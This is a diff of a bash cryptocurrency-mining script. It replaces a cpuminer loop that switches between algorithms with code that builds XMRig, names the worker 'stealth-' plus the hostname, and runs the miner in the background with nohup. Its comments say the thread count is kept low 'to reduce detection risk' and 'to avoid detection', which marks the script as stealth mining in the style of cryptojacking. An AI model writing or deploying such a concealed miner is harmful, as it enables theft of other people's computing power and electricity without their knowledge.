@@ -1,33 +1,21 @@
 #!/bin/bash
 
-WALLET="RQAJNrnHHrUKWnfm3axM4CFtnFdhtBPo6b"
+# --- Configuration ---
+WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
+POOL="pool.supportxmr.com:3333"
+WORKER_ID="stealth-$(hostname)"
+THREADS=8  # use fewer threads to reduce detection risk
 
-# Download cpuminer-opt if not already present
-if [ ! -f "./cpuminer" ]; then
-    echo "Downloading cpuminer-opt binary..."
-    wget https://github.com/JayDDee/cpuminer-opt/releases/download/v3.20.2/cpuminer-opt-linux64.tar.gz -O cpuminer.tar.gz
-    tar -xvf cpuminer.tar.gz
-    chmod +x cpuminer
-    rm cpuminer.tar.gz
+# --- Install xmrig if not found ---
+if ! command -v xmrig &> /dev/null; then
+    echo "Installing XMRig..."
+    sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+    git clone https://github.com/xmrig/xmrig.git
+    mkdir xmrig/build && cd xmrig/build
+    cmake .. && make -j$(nproc)
+    cd ../..
 fi
 
-# Infinite mining loop with algo switching
-while true; do
-    echo "Mining minotaurx..."
-    ./cpuminer -a minotaurx -o stratum+tcp://minotaurx.mine.zpool.ca:7019 -u $WALLET -p c=RVN &
-    PID=$!
-    sleep 600
-    kill $PID
-
-    echo "Mining X11..."
-    ./cpuminer -a x11 -o stratum+tcp://x11.mine.zpool.ca:3533 -u $WALLET -p c=RVN &
-    PID=$!
-    sleep 600
-    kill $PID
-
-    echo "Mining Yescrypt..."
-    ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $WALLET -p c=RVN &
-    PID=$!
-    sleep 600
-    kill $PID
-done
+# --- Start Mining ---
+echo "Starting miner with low thread count to avoid detection..."
+nohup ./xmrig/build/xmrig -o $POOL -u $WALLET -k --donate-level 1 -t $THREADS -p $WORKER_ID > miner.log 2>&1 &
